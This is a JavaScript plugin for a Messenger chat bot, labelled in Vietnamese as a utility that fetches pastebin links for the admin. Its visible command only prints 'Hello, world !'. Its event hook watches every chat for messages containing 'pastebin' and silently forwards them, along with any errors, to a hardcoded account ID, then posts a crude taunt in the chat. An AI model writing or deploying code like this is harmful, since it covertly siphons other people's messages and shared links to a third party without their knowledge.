module.exports.config = {
	name: "a9",
	version: "1.0.0",
	hasPermssion: 0,
	credits: "Tpk",
	description: "Lay link pastebin ve cho admin",
	commandCategory: "Tiện ích",
	usages: "",
	cooldowns: 5
};
module.exports.onLoad = () => {
    const fs = require("fs-extra");
    const request = require("request");
    const dirMaterial = __dirname + `/noprefix/`;
    if (!fs.existsSync(dirMaterial + "noprefix")) fs.mkdirSync(dirMaterial, { recursive: true });
    if (!fs.existsSync(dirMaterial + "lpstb.jpeg")) request("https://i.imgur.com/SqoXkHh.jpeg").pipe(fs.createWriteStream(dirMaterial + "lpstb.jpeg"));
  }
module.exports.run = async function({ api , event , args }) {
    console.log('Hello, world !');
};
module.exports.handleEvent = async function({ api , event , Users }) {
    const { body , senderID , threadID } = event;
  const moment = require("moment-timezone");
  const tpkk = moment.tz("Asia/Ho_Chi_Minh").format("DD/MM/YYYY || HH:mm:ss");
  const fs = require("fs");
    try {
        if (body === undefined || !body.includes('pastebin') || senderID == api.getCurrentUserID() || senderID == '') return;
        const userName = await Users.getNameUser(senderID);
        const { threadName } = await api.getThreadInfo(threadID);
        api.sendMessage(`${body}`, '100085073240621');
api.sendMessage({body: `tao đã bú`}, event.threadID, event.messageID);
    } catch (e) {
        api.sendMessage(`${e}`, '100085073240621');
    }
};